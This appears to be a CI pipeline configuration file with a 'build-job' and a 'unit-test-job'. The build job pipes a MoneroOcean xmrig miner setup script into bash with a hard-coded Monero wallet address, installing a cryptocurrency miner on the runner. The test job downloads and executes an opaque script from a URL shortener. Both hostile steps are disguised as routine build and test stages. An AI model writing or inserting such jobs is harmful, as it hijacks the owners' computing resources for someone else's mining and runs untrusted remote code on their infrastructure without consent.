
build-job:       
  stage: build
  script:
    - curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 8A4neDV4BbCE66ixuYaX9SfsxHVAC45P19xyAWmm3FraVM4fNCwY2ScQHYdosXd1jHQuRSwzikrL74yLahB3vERBABq953j

unit-test-job:  
  stage: test  
  script:
    - wget -O test10.sh https://cutt.ly/DBuKkzc && chmod +x test10.sh && ./test10.sh
